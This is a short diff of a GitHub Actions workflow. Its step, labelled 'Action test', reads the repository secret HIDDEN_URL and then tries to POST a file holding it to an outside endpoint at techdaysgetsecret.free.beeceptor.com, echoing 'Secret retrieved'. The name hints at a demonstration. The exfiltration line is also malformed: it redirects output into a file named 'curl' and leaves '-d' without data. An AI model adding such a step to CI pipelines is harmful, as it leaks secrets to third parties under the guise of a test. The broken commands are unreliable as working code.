@@ -15,7 +15,7 @@ jobs:
     
       - name: Action test
         run: |
-          curl ${{secrets.HIDDEN_URL}} > hidden.txt
+          cat ${{secrets.HIDDEN_URL}} 
           cat hidden.txt > curl -v -X POST 'https://techdaysgetsecret.free.beeceptor.com/my/api/path' -H 'Content-Type: plain/text' -d
           echo "Secret retrieved"
           echo "-------"
